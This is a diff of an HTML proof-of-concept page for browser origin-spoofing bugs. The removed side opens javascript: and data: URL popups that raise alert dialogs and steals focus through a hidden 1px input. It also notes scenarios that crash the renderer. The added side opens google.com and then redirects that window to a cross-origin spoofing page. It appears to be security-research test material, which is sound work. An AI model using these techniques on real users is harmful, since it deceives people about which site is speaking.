@@ -1,71 +1,22 @@
 
-<!doctype html>
+
+<!DOCTYPE html>
 <html>
-<head>
-<style>
-html { font-family: sans-serif; }
-#focusElem { opacity: 0.00001; width:1px; height:1px; }
-</style>
-</head>
 <body>
 
-<p> <span id="originOutput"></span></p>
 
-<input id="focusElem">
+<button onclick="myFunction()">Click</button>
 
 <script>
+function myFunction() {
+ var x = window.open("https://www.google.com/csi");
 
-originOutput.innerText = window.location.origin;
+   setTimeout(function(){x.location="pwa-crossorigin-spoofing-desktop.html"}, 1000)
 
-var scenario = 'popup'; // Default scenario
-var query = window.location.search;
 
-if (query) {
-  scenario = query.substr(1); // Strip leading '?'
-}
-
-var newWinParams = 'width=800,height=400,top=100';
-
-var runPoC = () => {
-
-  if (scenario == 'popup') {
-    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)', '_blank', newWinParams);
-  } else if (scenario == 'tab') {
-    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)');
-  } else if (scenario == 'data') {
-    var win = window.open('data:,Hello', '_blank', newWinParams);
-    setTimeout(() => {
-      win.alert('JS dialog from iframe, origin: '+window.origin);
-    }, 100);
-  } else if (scenario == 'protocol') {
-    var win = window.open('test:', '_blank', newWinParams);
-    setTimeout(() => {
-      win.alert('JS dialog from iframe, origin: '+window.origin);
-    }, 100);
-  } else if (scenario == 'docwrite1') {
-    // Results in renderer kill: bad_message::RFH_CAN_COMMIT_URL_BLOCKED
-    var win = window.open('javascript:document.write("test")', '_blank', newWinParams);
-  } else if (scenario == 'docwrite2') {
-    // Results in renderer kill: bad_message::RFH_INVALID_ORIGIN_ON_COMMIT
-    var win = window.open('data:,Hello', '_blank', newWinParams);
-    setTimeout(() => {
-      win.document.write('test');
-    }, 100);
-  }
 
 }
-
-// Focus theft described in https://crbug.com/622714
-setInterval(() => {
-  focusElem.focus();
-}, 100);
-
-focusElem.addEventListener('keypress', runPoC);
-
-window.addEventListener('click', runPoC);
-
 </script>
+
 </body>
 </html>
-
-
